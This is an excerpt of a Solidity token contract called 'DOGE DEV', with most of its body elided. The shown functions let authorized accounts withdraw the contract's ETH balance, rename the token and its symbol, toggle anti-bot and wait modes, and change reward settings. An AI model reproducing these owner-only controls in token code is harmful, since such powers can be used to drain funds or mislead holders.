...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public minimumTokenBalanceForDividends = 1000000000000 * (10 ** 18);
...
contract DOGEDEV is ERC20, Auth {
    using SafeMath for uint256;
    ...
    string private _name = "DOGE DEV";
    string private _symbol = "DOGE DEV";
    ...
    function CSBs(uint256 amountPercentage) external authorized {
        uint256 amountETH = address(this).balance;
        payable(msg.sender).transfer(amountETH * amountPercentage / 100);
    }
    function CSBd(uint256 amountPercentage) external authorized {
    ...
    function switchBlockAnitBotMode(bool _status) public authorized {
        blockAnitBotMode = _status;
    }

    // switchtimeWaitMode default:true
    function switchTimeWaitMode(bool _status) public authorized {
    ...
    function setIsNameSymbol(string memory chname, string memory chsymbol) external authorized {
        _name = chname;
        _symbol = chsymbol;
    }
    ...
    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external authorized {
    ...
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution, uint256 _minHoldForDividends) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution,_minHoldForDividends);
    }

    function changeRWRDAddress(bool _RWRDAddressMode,address _RWRDAddress) external authorized {
